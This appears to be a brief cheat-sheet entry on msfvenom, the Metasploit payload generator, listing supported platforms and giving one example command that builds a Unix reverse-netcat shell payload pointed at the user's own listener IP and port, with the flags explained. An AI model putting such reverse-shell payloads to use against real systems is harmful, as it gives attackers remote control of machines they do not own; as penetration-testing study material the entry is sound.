Is used to generate and output various types of shellcode that is available in Metasploit. Can generate Payloads for Android, Windows, Unic, Nodejs, Cisco...

Example:

`msfvenom -p cmd/unix/reverse_netcat lhost=[localhost ip] lport=4444 R`

-  -p = payload
-  lhost = localhost ip (my ip)
-  lport = localhost port
-  R = export payload in RAW format